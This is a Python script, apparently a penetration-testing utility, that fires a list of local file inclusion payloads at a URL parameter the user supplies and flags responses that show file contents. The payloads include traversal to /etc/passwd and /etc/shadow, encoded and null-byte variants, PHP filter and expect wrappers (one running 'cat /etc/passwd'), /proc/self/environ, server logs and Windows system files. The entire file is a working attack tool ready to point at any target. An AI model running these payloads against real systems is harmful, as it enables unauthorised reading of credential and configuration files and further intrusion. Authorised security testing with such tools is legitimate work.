#!/usr/bin/env python3
"""
LFI Tester - Test Local File Inclusion vulnerabilities.

Usage:
    python lfi_tester.py <target_url> <parameter_name>

Example:
    python lfi_tester.py http://target.com/read?file= file
    python lfi_tester.py http://target.com/download?path= path
"""

import requests
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== Configuration =====
session = requests.Session()
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# session.proxies.update(proxies)
# session.verify = False

# Common LFI payloads
LFI_PAYLOADS = [
    # Basic paths
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    # Directory traversal
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    # Encoded traversal
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    # URL encoding variations
    "....//....//....//etc/passwd",
    "....\\....\\....\\etc\\passwd",
    # Wrappers (PHP)
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/resource=/etc/passwd",
    "php://expect://cat%20/etc/passwd",
    # Null byte (older PHP)
    "/etc/passwd%00.jpg",
    "/etc/passwd%00",
    # Alternative file paths
    "/proc/self/environ",
    "/proc/self/fd/0",
    "/proc/self/cwd",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/www/html/index.php",
    # Windows paths
    "..\\..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini",
    "..\\..\\..\\boot.ini",
    # Config files
    "/etc/php.ini",
    "/etc/apache2/apache2.conf",
    "/etc/nginx/nginx.conf",
]

# Indicators of successful LFI
SUCCESS_INDICATORS = [
    "root:",  # /etc/passwd
    "vagrant:",
    "[boot loader]",  # win.ini
    "[extensions]",
    "_PWD=",  # /proc/self/environ
    "PATH=",
    "<!DOCTYPE",  # PHP files
    "<?php",
    "<html",
]


def test_lfi(target_url, param_name, payload):
    """Test single LFI payload"""
    try:
        params = {param_name: payload}
        r = session.get(target_url, params=params, verify=False, timeout=5)
        return r.status_code, r.text
    except Exception as e:
        return None, str(e)


def check_success(response_text):
    """Check if response indicates successful LFI"""
    for indicator in SUCCESS_INDICATORS:
        if indicator.lower() in response_text.lower():
            return True
    return False


def run_lfi_test(target_url, param_name):
    """Run full LFI test suite"""
    print(f"[*] LFI Tester")
    print(f"[*] Target: {target_url}")
    print(f"[*] Parameter: {param_name}")
    print(f"[*] Testing {len(LFI_PAYLOADS)} payloads...")
    print()

    found = False

    for i, payload in enumerate(LFI_PAYLOADS, 1):
        status, response = test_lfi(target_url, param_name, payload)

        if status is None:
            print(f"[!] Payload {i}: ERROR - {response}")
            continue

        # Check for success indicators
        is_success = check_success(response)

        if is_success:
            print(f"[+] VULNERABLE: {payload}")
            print(f"    Status: {status}")
            print(f"    Response length: {len(response)}")
            print(f"    Preview: {response[:200]}...")
            print()
            found = True
        elif status == 200 and len(response) > 100:
            print(f"[?] Possible hit: {payload}")
            print(f"    Status: {status}, Response: {len(response)} bytes")
            print(f"    Preview: {response[:200]}...")
            print()

        # Rate limiting
        time.sleep(0.1)

    if not found:
        print("[-] No obvious LFI vulnerabilities detected")
        print("[*] Try manual inspection of responses or different parameters")

    return found


# ===== Main =====
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python lfi_tester.py <target_url> <parameter_name>")
        print("\nExample:")
        print("  python lfi_tester.py http://target.com/read?file= file")
        print("  python lfi_tester.py http://target.com/page?path= path")
        print(
            "\nCommon parameters: file, path, page, document, include, req, resource, load"
        )
        sys.exit(1)

    target_url = sys.argv[1]
    param_name = sys.argv[2]

    run_lfi_test(target_url, param_name)
